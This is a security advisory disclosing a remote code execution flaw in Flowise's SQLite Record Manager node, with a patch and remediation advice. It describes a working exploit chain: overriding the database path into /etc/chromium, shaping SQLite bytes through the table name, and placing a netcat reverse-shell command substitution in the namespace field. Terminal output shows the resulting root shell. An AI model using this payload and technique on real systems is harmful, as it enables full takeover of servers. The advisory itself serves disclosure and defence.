# [C] Flowise RCE via SQLite Record Manager Node

## Summary
Severity: Critical
Advisory: GHSA-x3hf-7cj6-3r4m
CVE: CVE-2026-69259
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-08-04
Source: https://github.com/advisories/GHSA-x3hf-7cj6-3r4m
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.1.3
- npm: `flowise-components` — affected >=0 <3.1.3

## Details
=============================================================================
                                                            Security Advisory
                                                                       elttam

Topic:          Flowise RCE via SQLite Record Manager Node

Module:         FlowiseAI/Flowise
Disclosed:      24-Apr-2026
Credits:        Alex Brown
Affects:        `FlowiseAI/Flowise 3.1.2`

# I.   Background

Flowise AI is an open-source, low-code platform for building AI applications—such as chatbots, workflows, and autonomous agents—through an intuitive drag-and-drop interface, minimising the need for extensive coding.

Flowise allows users to connect to a local SQLite database for record management of Upsert Vector Store operations.

# II.  Problem Description

The database path for the "SQLite Record Manager" node could be overridden using the `additionalConfig` input, as demonstrated in the following code snippet.

[https://github.com/FlowiseAI/Flowise/blob/flowise-components@3.1.2/packages/components/nodes/recordmanager/SQLiteRecordManager/SQLiteRecordManager.ts](https://github.com/FlowiseAI/Flowise/blob/flowise-components%403.1.2/packages/components/nodes/recordmanager/SQLiteRecordManager/SQLiteRecordManager.ts)
```ts
class SQLiteRecordManager_RecordManager implements INode {
    ...
    async init(nodeData: INodeData, _: string, options: ICommonObject): Promise<any> {
        const _tableName = nodeData.inputs?.tableName as string
        const tableName = _tableName ? _tableName : 'upsertion_records'
        const additionalConfig = nodeData.inputs?.additionalConfig as string <1>
        const _namespace = nodeData.inputs?.namespace as string
        const namespace = _namespace ? _namespace : options.chatflowid
        const cleanup = nodeData.inputs?.cleanup as string
        const _sourceIdKey = nodeData.inputs?.sourceIdKey as string
        const sourceIdKey = _sourceIdKey ? _sourceIdKey : 'source'

        let additionalConfiguration = {}
        if (additionalConfig) {
            try {
                additionalConfiguration = typeof additionalConfig === 'object' ? additionalConfig : JSON.parse(additionalConfig)
            } catch (exception) {
                throw new Error('Invalid JSON in the Additional Configuration: ' + exception)
            }
        }

        const database = path.join(process.env.DATABASE_PATH ?? path.join(getUserHome(), '.flowise'), 'database.sqlite') <2>

        const sqliteOptions = {
            database,
            ...additionalConfiguration, <3>
            type: 'sqlite'
        }

        const args = {
            sqliteOptions,
            tableName: tableName
        }

        const recordManager = new SQLiteRecordManager(namespace, args)

        ;(recordManager as any).cleanup = cleanup
        ;(recordManager as any).sourceIdKey = sourceIdKey

        return recordManager
    }
}
```
<1> The `additionalConfig` input was user controllable.

<2> The intended SQLite database path.

<3> Keyword argument expansion of the `additionalConfiguration` variable after the `database` variable, which allows overwriting the preceding `database` setting.

An attacker could abuse this weakness to write an SQLite database to an arbitrary filepath, which includes system directories since the [`flowiseai/flowise:3.1.2`](https://hub.docker.com/layers/flowiseai/flowise/3.1.2/images/sha256-ddba104d8e50fbc1e72c6fe021d012be83e66d78d26816e1a6a3fddab4212eff) Docker image runs as `root`.

However, unlike the [Flowise RCE via SQL Database Chain Node vulnerability](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-pwfj-wh95-7mwp), the executed SQL query was not user controllable and the `tableName` input was validated to match the `/^[a-zA-Z0-9_]+$/` regex pattern, as shown in the following code snippet.

[https://github.com/FlowiseAI/Flowise/blob/flowise-components@3.1.2/packages/components/nodes/recordmanager/SQLiteRecordManager/SQLiteRecordManager.ts](https://github.com/FlowiseAI/Flowise/blob/flowise-components%403.1.2/packages/components/nodes/recordmanager/SQLiteRecordManager/SQLiteRecordManager.ts)
```ts
class SQLiteRecordManager implements RecordManagerInterface {
    ...

    sanitizeTableName(tableName: string): string {
        // Trim and normalize case, turn whitespace into underscores
        tableName = tableName.trim().toLowerCase().replace(/\s+/g, '_')

        // Validate using a regex (alphanumeric and underscores only)
        if (!/^[a-zA-Z0-9_]+$/.test(tableName)) { <1>
            throw new Error('Invalid table name')
        }

        return tableName
    }

    ...

    async createSchema(): Promise<void> {
        const dataSource = await this.getDataSource()
        try {
            const queryRunner = dataSource.createQueryRunner()
            const tableName = this.sanitizeTableName(this.tableName) <1>

            await queryRunner.manager.query(` <2>
CREATE TABLE IF NOT EXISTS "${tableName}" (
  uuid TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16)))),
  key TEXT NOT NULL,
  namespace TEXT NOT NULL,
  updated_at REAL NOT NULL,
  group_id TEXT,
  UNIQUE (key, namespace)
);
CREATE INDEX IF NOT EXISTS updated_at_index ON "${tableName}" (updated_at);
CREATE INDEX IF NOT EXISTS key_index ON "${tableName}" (key);
CREATE INDEX IF NOT EXISTS namespace_index ON "${tableName}" (namespace);
CREATE INDEX IF NOT EXISTS group_id_index ON "${tableName}" (group_id);`)

            // Add doc_id column if it doesn't exist (migration for existing tables)
            const checkColumn = await queryRunner.manager.query(
                `SELECT COUNT(*) as count FROM pragma_table_info('${tableName}') WHERE name='doc_id';`
            )
            if (checkColumn[0].count === 0) {
                await queryRunner.manager.query(`ALTER TABLE "${tableName}" ADD COLUMN doc_id TEXT;`)
                await queryRunner.manager.query(`CREATE INDEX IF NOT EXISTS doc_id_index ON "${tableName}" (doc_id);`)
            }

            await queryRunner.release()
        } catch (e: any) {
            // This error indicates that the table already exists
            // Due to asynchronous nature of the code, it is possible that
            // the table is created between the time we check if it exists
            // and the time we try to create it. It can be safely ignored.
            if ('code' in e && e.code === '23505') {
                return
            }
            throw e
        } finally {
            await dataSource.destroy()
        }
    }

    ...

    async update(keys: Array<{ uid: string; docId: string }> | string[], updateOptions?: UpdateOptions): Promise<void> {
        if (keys.length === 0) {
            return
        }
        const dataSource = await this.getDataSource()
        const queryRunner = dataSource.createQueryRunner()
        const tableName = this.sanitizeTableName(this.tableName)

        const updatedAt = await this.getTime()
        const { timeAtLeast, groupIds: _groupIds } = updateOptions ?? {}

        if (timeAtLeast && updatedAt < timeAtLeast) {
            throw new Error(`Time sync issue with database ${updatedAt} < ${timeAtLeast}`)
        }

        // Handle both new format (objects with uid and docId) and old format (strings)
        const isNewFormat = keys.length > 0 && typeof keys[0] === 'object' && 'uid' in keys[0]
        const keyStrings = isNewFormat ? (keys as Array<{ uid: string; docId: string }>).map((k) => k.uid) : (keys as string[])
        const docIds = isNewFormat ? (keys as Array<{ uid: string; docId: string }>).map((k) => k.docId) : keys.map(() => null)

        const groupIds = _groupIds ?? keyStrings.map(() => null)

        if (groupIds.length !== keyStrings.length) {
            throw new Error(`Number of keys (${keyStrings.length}) does not match number of group_ids (${groupIds.length})`)
        }

        const recordsToUpsert = keyStrings.map((key, i) => [key, this.namespace, updatedAt, groupIds[i] ?? null, docIds[i] ?? null]) <3>

        const query = `
        INSERT INTO "${tableName}" (key, namespace, updated_at, group_id, doc_id)
        VALUES (?, ?, ?, ?, ?)
        ON CONFLICT (key, namespace) DO UPDATE SET updated_at = excluded.updated_at, doc_id = excluded.doc_id`

        try {
            // To handle multiple files upsert
            for (const record of recordsToUpsert) {
                // Consider using a transaction for batch operations
                await queryRunner.manager.query(query, record.flat())
            }
            await queryRunner.release()
        } catch (error) {
            console.error('Error updating in SQLiteRecordManager:')
            throw error
        } finally {
            await dataSource.destroy()
        }
    }
    ...
}
```
<1> Validates the `tableName` input matches the regex pattern `/^[a-zA-Z0-9_]+$/`.

<2> The SQL command creating the database table, which is not user controllable.

<3> The `this.namespace` is a user controllable input for the node.

Since the allowed characters of the `tableName` input were restricted, it was not possible to utilise the same technique from [GHSA-pwfj-wh95-7mwp](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-pwfj-wh95-7mwp) to comment out `()` characters within the SQLite database file that would cause a syntax error when executed as a shell script. To avoid this limitation, the binary structure of SQLite databases was investigated, where the following output shows the binary structure of the `doc_id_index` cell using the default `upsertion_records` table name.

```
Bytes         Raw    Decoded
──────────────────────────────────────────────────
[3574:3575]   62     payload length = 98
[3575:3576]   04     rowid = 4

── Record Header ──────────────────────────────
[3576:3577]   06     header length = 6
[3577:3578]   17     col 0 = 23  → TEXT 5 bytes   ('index')
[3578:3579]   25     col 1 = 37  → TEXT 12 bytes  ('doc_id_index')
[3579:3580]   2f     col 2 = 47  → TEXT 17 bytes  ('upsertion_records') <1>
[3580:3581]   01     col 3 = 1   → INT8 1 byte
[3581:3582]   7f     col 4 = 127 → TEXT 57 bytes  (CREATE INDEX sql)

── Record Body ────────────────────────────────
[3582:3587]   696e646578     col 0 = 'index'
[3587:3599]   646f635f69…    col 1 = 'doc_id_index'
[3599:3616]   757073657274…  col 2 = 'upsertion_records'
[3616:3617]   05             col 3 = 5  (root page = page 5)
[3617:3674]   43524541544…   col 4 = 'CREATE INDEX doc_id_index ON "upsertion_records" (doc_id)'
```
<1> `\x2f` serial type corresponds to a `TEXT` value that is 17 bytes long.

The length of the table name can be manipulated, and a serial type of `'` corresponds to a string that is 13 bytes long. The injected `'` could then be used to wrap the problematic `()` characters within the cell, which is then closed by the `namespace` input that also contains a reverse shell payload that is executed when Puppeteer launches a Chromium browser reading the malicious SQLite database from a `/etc/chromium/*.conf` file.

The following steps document the procedure to reproduce this issue:

1. Import the following Chatflow and configure the OpenAI and Weaviate nodes. Observe that the `additionalConfig.database` input for the SQLite Record Manager node is set to `/etc/chromium/exploit.conf`, which is the destination the SQLite database will be created. The `tableName` input is set to `AAAAAAAAAAAAA`, so the encoded serial type of its length would be `'`, and the `namespace` is set to `'$(/usr/bin/nc 172.17.0.1 1337 -e /bin/sh)` to close the previous `'` and then use command substitution to execute a reverse shell payload. Perform an Upsert Vector Store operation and observe the SQLite database being created at `/etc/chromium/exploit.conf`.

[sqlite-record-rce-poc.json](https://github.com/user-attachments/files/27053431/sqlite-record-rce-poc.json)

2. Import the following Chatflow and perform an Upsert Vector Store operation. When Puppeteer is launched, it will execute `chromium-browser` that sources all `/etc/chromium/*.conf` files, triggering the reverse shell payload as shown in the following terminal output.

[sqlite-sqlchain-puppeteer-trigger.json](https://github.com/user-attachments/files/27053441/sqlite-sqlchain-puppeteer-trigger.json)

```terminal
$ nc -lnvp 1337
Listening on 0.0.0.0 1337
Connection received on 172.17.0.2 40677
id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
ps aux
PID   USER     TIME  COMMAND
    1 root      0:13 node /usr/local/bin/flowise start
   18 root      0:00 [sh]
   30 root      0:00 {chromium-browse} /bin/sh /usr/bin/chromium-browser --allow-pre-commit-input --disable-background-networking --disable-background-timer-throttling --disable-backgrounding-occluded-windows --disable-breakpad --disable-client-side-phishing-detection --disable-component-extensions-with-background-pages --disable-component-update --disable-default-apps --disable-dev-shm-usage --disable-features=Translate,BackForwardCache,AcceptCHFrame,MediaRouter,OptimizationHints --disable-hang-monitor --disable-ipc-flooding-protection --disable-popup-blocking --disable-prompt-on-repost --disable-renderer-backgrounding --disable-sync --enable-automation --enable-blink-features=IdleDetection --enable-features=NetworkServiceInProcess2 --export-tagged-pdf --force-color-profile=srgb --metrics-recording-only --no-first-run --password-store=basic --use-mock-keychain --headless=new --hide-scrollbars --mute-audio about:blank --no-sandbox --remote-debugging-port=0 --user-data-dir=/tmp/puppeteer_dev_chrome_profile-AnFBBC
   31 root      0:00 /bin/sh
   33 root      0:00 ps aux
```
 
# III. Impact

An authenticated user on a Flowise instance using the published Docker image could exploit this vulnerability to achieve RCE, resulting in full compromise of the application.

# IV.  Solution

Consider performing the following remediation activities:

* Ensure that the `additionalConfig` input could not be abused to overwrite the `database` property to an arbitrary file path.

* Use a low-privileged user for container runtimes instead of the privileged `root` user, since the `root` user has file access to the entire filesystem of the container.

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-x3hf-7cj6-3r4m
- https://github.com/FlowiseAI/Flowise/pull/6464
- https://github.com/FlowiseAI/Flowise/commit/d07186844263bad057008863037466aff7c3390f
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3
